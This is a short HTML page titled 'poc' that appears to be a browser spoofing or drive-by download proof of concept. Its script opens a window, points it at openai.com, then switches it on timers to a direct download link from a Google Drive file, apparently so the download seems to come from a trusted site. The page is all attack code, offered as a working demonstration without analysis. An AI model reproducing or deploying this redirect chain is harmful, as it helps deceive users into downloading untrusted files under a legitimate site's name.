<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>poc</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        w.location.replace(urls[index]);
        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
      }
    }

    function startRedirect() {
      let w = window.open("");
      setTimeout(() => {
        chainRedirect(w, [
        "https://openai.com",
        "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=dbf84869-b028-42ae-be84-2f99a61f81ce&at=AGN2oQ1Eb86L8ZXuseYnXn2FPPXs:1773900102109",
        "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=dbf84869-b028-42ae-be84-2f99a61f81ce&at=AGN2oQ1Eb86L8ZXuseYnXn2FPPXs:1773900102109",
        ]);
      }, 1000);
    }
  </script>
</head>
<body>
  <button onclick="startRedirect()">Start</button>
</body>
</html>
